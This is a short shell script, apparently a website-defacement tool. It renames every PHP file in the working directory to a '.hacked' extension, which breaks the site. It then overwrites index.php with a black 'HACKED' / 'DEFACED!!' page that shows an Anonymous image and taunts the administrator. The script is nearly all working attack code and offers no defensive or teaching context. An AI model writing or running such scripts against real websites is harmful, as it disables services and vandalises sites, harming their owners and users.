echo "################## Defacing Website ################## "

for filename in *.php; do
    mv $filename "${filename}.hacked"
done

echo '<!DOCTYPE html>
<html>
<head>
  <title>DEFACED!! </title>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <link rel="stylesheet" type="text/css" href="css/bootstrap.min.css">
    <link rel="stylesheet" type="text/css" href="css/stylesheet.css">
</head>
<body style="background-color:black;">
<div class="container">
      <div class="header clearfix">
        <nav>
          <ul class="nav nav-pills pull-right">
          </ul>
        </nav>
        <h3 class="text-muted" style="color:white;">DEFACED!!</h3>
      </div>

      <div class="jumbotron" style="background-color:black;">
        <h1 style="color:white;">HACKED</h1>
        <img src="./img/anonymous.jpg">
        <h2>  Hey Admin, it looks like your website is not so safe !!</h2>
      </div>
</body>
</html>
' > index.php

echo "################## Website Defaced Successfully ################## "